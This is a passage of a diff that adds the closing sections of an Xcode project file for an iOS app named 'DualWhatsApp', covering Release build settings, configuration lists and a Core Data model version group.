+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		0F9AFBAA2E9672E0005B871B /* Build configuration list for PBXProject "DualWhatsApp" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				0F9AFBC82E9672E2005B871B /* Debug */,
+				0F9AFBC92E9672E2005B871B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		0F9AFBC52E9672E2005B871B /* Build configuration list for PBXNativeTarget "DualWhatsApp" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				0F9AFBC62E9672E2005B871B /* Debug */,
+				0F9AFBC72E9672E2005B871B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+/* Begin XCVersionGroup section */
+		0F9AFBCC2E9672EF005B871B /* DualWhatsApp.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				0F9AFBD52E9672EF005B871B /* DualWhatsApp.xcdatamodel */,
+			);
+			currentVersion = 0F9AFBD52E9672EF005B871B /* DualWhatsApp.xcdatamodel */;
+			path = DualWhatsApp.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 0F9AFBA72E9672E0005B871B /* Project object */;
+}
